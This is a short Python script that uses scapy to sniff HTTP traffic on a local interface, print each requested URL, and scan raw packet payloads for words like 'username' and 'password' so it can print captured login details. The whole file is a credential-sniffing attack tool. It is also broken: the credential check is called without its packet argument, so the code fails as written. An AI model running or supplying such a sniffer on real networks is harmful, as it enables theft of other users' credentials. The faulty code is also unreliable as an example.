import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_packet_cb)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def try_get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        # print(packet)
        # print(packet.show())
        load = str(packet[scapy.Raw].load)
        keywords = ["username", "email", "password", "login", "user"]
        for kw in keywords:
            if kw in load:
                return load

def process_packet_cb(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + url.decode())
        
        login_info = try_get_login_info()
        if login_info:
            print("\n\n[+] Possible username/password: " + login_info + "\n\n")
        
sniff("en0")